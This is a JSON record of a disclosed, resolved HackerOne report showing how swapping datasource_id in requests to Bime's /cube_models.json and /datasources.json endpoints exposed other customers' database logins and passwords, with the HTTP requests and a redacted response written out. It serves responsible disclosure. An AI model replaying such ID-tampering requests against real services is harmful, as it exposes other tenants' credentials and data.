{
  "id": 149907,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDk5MDc=",
  "url": "https://hackerone.com/reports/149907",
  "title": "Urgent: attacker can access every data source on Bime",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-07-08T03:53:26.690Z",
  "submitted_at": "2016-07-08T03:53:26.690Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jobert",
    "url": "/jobert",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 7068,
    "url": "https://hackerone.com/bime",
    "handle": "bime",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/068/046bc25f4f1f4c11ec1da9b821f0c112f4ab33e5_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/068/046bc25f4f1f4c11ec1da9b821f0c112f4ab33e5_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Bime",
      "twitter_handle": "",
      "website": "https://www.bimeanalytics.com",
      "about": "BIME allows customers to import data, create various queries, and view customizable dashboards - all within BIME's beautifully intuitive interface."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-07-27T15:00:35.144Z",
  "bug_reporter_agreed_on_going_public_at": "2016-07-15T22:01:38.211Z",
  "team_member_agreed_on_going_public_at": "2016-07-27T15:00:35.052Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Vulnerability details\nI don't include words like \"urgent\" in my title very often, but I thought you might want to get onto this right away. An attacker can access the data source of any other customer on the BIME platform through the `/cube_models.json` endpoint. This leaks, for example, the login information of Postgres backends (including hostname, login, and passwords). I haven't verified whether the passwords are encrypted, but this seems pretty bad nevertheless.\n\n# Proof of concept\nSign in as a normal user - I used my personal email address on the https://h1-bugbounty.bime.io domain. I added a CSV as data source to set up a new dashboard. During this flow, the following request is sent to the server:\n\n```\nPOST /cube_models.json HTTP/1.1\nHost: h1-bugbounty.bime.io\n...\n\n{\"import_strategy\":\"replace\",\"configuration\":\"{\\\"bimeDb\\\":{\\\"arrayVarcharLength\\\":500,\\\"numberOfDecimals\\\":2},\\\"queryBlender\\\":{\\\"pushdown\\\":true,\\\"raiseWarnings\\\":true},\\\"infiniteCache\\\":{},\\\"timeZone\\\":\\\"\\\",\\\"mergeFields\\\":\\\"\\\",\\\"schedule\\\":{\\\"cronExp\\\":\\\"0 0 0 * * ?\\\",\\\"cronText\\\":\\\"Every day at 00 : 00\\\",\\\"emailOnSuccess\\\":false,\\\"emailOnFailure\\\":false,\\\"refreshRate\\\":\\\"importNow\\\"},\\\"bundle\\\":{},\\\"sortWeekdayFromMonday\\\":true}\",\"model_category_id\":527921,\"name\":\"CSV Connection 1\",\"cache_type\":\"dejaVu\",\"use_cache\":true,\"datasource_id\":723592,\"technical_type\":\"filePicker\",\"in_memory_cache_time_to_live\":15,\"cube_schema\":\"PE9MQVBTY2hlbWEgZm9sZGVycz0iZXlKaGRIUnlhV0oxZEdWelJtOXNaR1Z5Y3lJNlcxMHNJbTFsWVhOMWNtVnpSbTlzWkdWeWN5STZXMTBzSW0xbFlYTjFjbVZ6Um05c1pHVnljMFJwYzNCc1lYbEdiM0p0WVhSeklqcGJYWDA9IiBsYWJlbD0iY3N2Y29ubmVjdGlvbjEtYmU2ODgiIGlzTGFyZ2VNb2RlbD0iZmFsc2UiIGFycmF5Q29sdW1ucz0iVzEwPSIgPjxEaW1lbnNpb25zPjxEaW1lbnNpb24gbGFiZWw9IkF4aXMgb2YgYW5hbHlzaXMiIGRpc3BsYXlOYW1lPSJBeGlzIG9mIGFuYWx5c2lzIiBpZD0iQXhpcyBvZiBhbmFseXNpcyI+PEF0dHJpYnV0ZXM+PEF0dHJpYnV0ZSBsYWJlbD0iSUQiIGRlc2NyaXB0aW9uPSJJRCIgZGlzcGxheU5hbWU9IklEIiBmb2xkZXJJbmRleD0iMCIgb3JpZ2luYWxEaXNwbGF5TmFtZT0iSUQiIHJlYWxUeXBlPSJtZWFzdXJlIiBjdXN0b209ImUzMD0iIGZvbGRlck5hbWU9IkF4aXMgb2YgYW5hbHlzaXMiIGdlb0xldmVsPSJhdXRvIiAvPjxBdHRyaWJ1dGUgbGFiZWw9InRpdGxlIiBkZXNjcmlwdGlvbj0idGl0bGUiIGRpc3BsYXlOYW1lPSJ0aXRsZSIgZm9sZGVySW5kZXg9IjAiIG9yaWdpbmFsRGlzcGxheU5hbWU9InRpdGxlIiByZWFsVHlwZT0iY3VzdG9tIiBjdXN0b209ImUzMD0iIGZvbGRlck5hbWU9IkF4aXMgb2YgYW5hbHlzaXMiIGdlb0xldmVsPSJhdXRvIiAvPjwvQXR0cmlidXRlcz48L0RpbWVuc2lvbj48L0RpbWVuc2lvbnM+PE1lYXN1cmVzIGRpc3BsYXlGb3JtYXQ9InN0YW5kYXJkX1dBQ18wX1dBQ18xMDAwX1dBQ19fV0FDX19XQUNfLl9XQUNfIF9XQUNfMV9XQUNfIj48L01lYXN1cmVzPjxDYWxjdWxhdGVkRmllbGRzPjxDYWxjdWxhdGVkTWVhc3VyZXM+PC9DYWxjdWxhdGVkTWVhc3VyZXM+PENhbGN1bGF0ZWRBdHRyaWJ1dGVzPjwvQ2FsY3VsYXRlZEF0dHJpYnV0ZXM+PC9DYWxjdWxhdGVkRmllbGRzPjwvT0xBUFNjaGVtYT4=\"}\n```\n\nNotice the `datasource_id` in this request. Send this request to the server again, but this time, change the ID to the data source that you want to access. You don't need to know the actual type of the datasource. After this, send a `GET` request to the `/datasources.json` endpoint, like shown below.\n\n```\nGET /datasources.json HTTP/1.1\nHost: h1-bugbounty.bime.io\n...\n```\n\n```\nHTTP/1.1 200 OK\n...\n\n[...\n{\n  \"id\": 723591,\n  \"technical_type\": \"Relational Databases\",\n  \"external_id\": \"█████████.db.databaselabs.io\",\n  \"login\": \"bot\",\n  \"email\": null,\n  \"tocken\": \"true\",\n  \"url\": \"█████████\",\n  \"public_key\": \"customSQL\",\n  \"private_key\": \"true\",\n  \"extra_param1_name\": \"dbPort\",\n  \"extra_param1_value\": \"5432\",\n  \"extra_param2_name\": null,\n  \"extra_param2_value\": \"postgreSQL\",\n  \"extra_param3_name\": null,\n  \"extra_param3_value\": \"██████████\",\n  \"created_at\": \"2016-07-08T03:09:29.000Z\",\n  \"updated_at\": \"2016-07-08T03:35:36.000Z\",\n  \"datasource_version\": 2,\n  \"configuration\": \"{\\\"invalidDateAs\\\":\\\"null\\\",\\\"meta\\\":{\\\"useReusableToken\\\":true},\\\"cloudStorage\\\":{\\\"bigQuery\\\":{},\\\"redshift\\\":{\\\"useEscapingV2\\\":true},\\\"useEscapingV2\\\":true},\\\"sqlServerLocale\\\":\\\"english\\\",\\\"union\\\":{},\\\"useBifeV2\\\":true,\\\"sqlVersion\\\":2,\\\"joinCulling\\\":true,\\\"usePushDown\\\":true,\\\"jdbcParameters\\\":[],\\\"useCache\\\":false}\",\n  \"final_type\": \"postgresql\",\n  \"pwd\": \"██████████\"\n},\n...]\n```\n\nThis will give the attacker access to every datasource on the BIME platform. It'll also be reflected on the datasources page, when signed in to the platform:\n\n{F103801}\n\nLet me know if you need more information.",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 103801,
      "file_name": "Screen_Shot_2016-07-07_at_20.39.52.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/103/801/ed5ca652c3610931349e4838fcd165c8eb04e8fc/Screen_Shot_2016-07-07_at_20.39.52.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-07-07_at_20.39.52.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-07-07_at_20.39.52.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTF44ZAEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121723Z&X-Amz-Expires=1889&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFEl8GqbU4%2BAZWXm076AaH%2B3S407ekrwvRLdQXFj8maSAiEA7oNJs0dICVPaCtN3NpIrAoDbQV6Ejyi77KrlQuPRpBUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNahsKqUdewADnORUCqPBbSt2LFuIdf7dnF6%2BSGZ9cPoiAZQMWLALN%2BWYyomEtoEWkOWvMa3f%2FvHfanqxv8y5APokVYlWhRKSi8EMnvvYlLkZCoZfEBYxrita%2BGJmOnAfLzKbAP4Y1yam8eHRyWd6gZv7A4xifGB4%2ByVBYpUwFfY%2FtSjbc%2FADNbGz8H5boNvsNv97iDrtAsWuhS%2BTsE9HMWty2Q5Kps5ZGh719NET5yzc4Q%2FtQXq6VZEsGmZJkhBk53ZbFfobOPyei9pZmZ6%2F2Mdq5510O22TvjtOWihXdrUVF18IGjoWAOzpmqJcFgY3pqd5Ptl8Jdv66jxrsyfzyou5wCExfQr5qzH9Vpmay4uCPhR%2FSyOG0CWwOh8b8NbDwQiT7n2e8mRdgfAZzQDYWZ3kDf3xJl4T%2BjizpvEyF4k8cnRHigJ9psCKck22rc%2FdJIeRzDPuK5gMydq%2BbZEiPRUgdLry1vf%2FHAVYzhqB51d5Ia44hsUeGvDrXu3hn5jGoJVb3p%2Bu8LXRAkstmLBEwTwx74%2BZLrtaIUbsPvoibM71bPShjn%2BeifHzFDMz1pzYAEKS3bKR%2BF6mAsb4TJcHb1aEgl%2F2VZr38huYt8TwDwXCn28i8e7UPTktLQ2%2BMY1xUbNU3qxurYTVuFskexXKmi%2BnALorE9k8A7GDdADBu%2BosuLTO%2FnUPwqP7dZYKwg749EtuHvA2OFyp16mblUz6KrLb%2FfAf3TLzS6zHIe9WcnoK0psjQn6DQdUv66ZNqunDkraEzFI7GUBVlDXzoFJMpTnm5cbS7icJeTI6SUbCamKJgZz1LYzEzm33%2FlZTz%2BFyEGL8HyorVpd5vY4dHVbb%2FeMQNELRsc2s1ONbdE6YfwyrhFyYvYBiYx9Ye%2F4ssowjpisrgY6sQFmStbg5zGr%2B68rMwEIJwcr9jwJvywdn4oxOR6RXInAJwN7lgch%2FvzVf1lSeRFZ6LuihOe%2FS4iwHxeNi0t9Xh3zgBPmKv%2FWlXb8g%2B6ZDByHn%2FH6haAptR1xW4BXNpTl7xRg1NW7b9aUxDCrRqOG%2Fy%2Bh2qYMDczVX6rGrxtEquYnaLpzcZzZ9hdZysgVk1A1SxT6%2Bkfp2tIiSadsRwSyKAYEPliJeaGXm3nwn7sIZmazF5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bcc60c4b941868907f008a25df655c0672a5100dafff25e6b0e26c7bcafe9507",
      "file_size": 64878,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2016-08-14T22:01:38.374Z",
  "allow_singular_disclosure_after": -236614544.83163455,
  "singular_disclosure_allowed": true,
  "vote_count": 54,
  "voters": [
    "sameoldstory",
    "inhibitor181",
    "bogdantcaciuc",
    "shailesh4594",
    "niemand_sec",
    "michiel",
    "sameerphad72",
    "dawgyg",
    "yaworsk",
    "mak",
    "and 44 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
